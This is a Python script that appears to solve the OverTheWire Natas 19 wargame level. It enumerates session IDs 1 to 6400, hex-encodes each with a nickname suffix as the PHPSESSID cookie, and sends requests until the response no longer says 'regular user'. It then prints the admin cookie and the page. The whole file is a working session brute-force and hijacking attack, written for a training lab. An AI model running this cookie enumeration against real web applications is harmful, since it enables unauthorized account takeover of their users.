import requests

url = "http://natas19.natas.labs.overthewire.org/"
auth  = ("natas19", "secret")

for sess_id in range(1, 6400):
    session_str = f"{sess_id}-nickname" # Nickname - Every letter/word that you print in field with name "Username" If field empty, cookie contains only number ID and BruteForce of sess_id be harder

    hex_cookie = session_str.encode().hex() # This line encode your PHPSESSID cookie in HEX

    my_cookies = {
        "PHPSESSID": hex_cookie
    }

    response = requests.get(url, cookies=my_cookies, auth=auth)

    print(f"Checking ID: {sess_id} ({hex_cookie}) . . .", end="\r")
    
    if "regular user" not in response.text.lower():
        print(f"[+]Admin session was founded! ID: {sess_id}")
        print(f"[+] Hex Cookie: {hex_cookie}")

        print("\nResponse text:")
        print(response.text)
        break
else:
    print(f"[-]Script finished to 6400 but Admin session not founded.")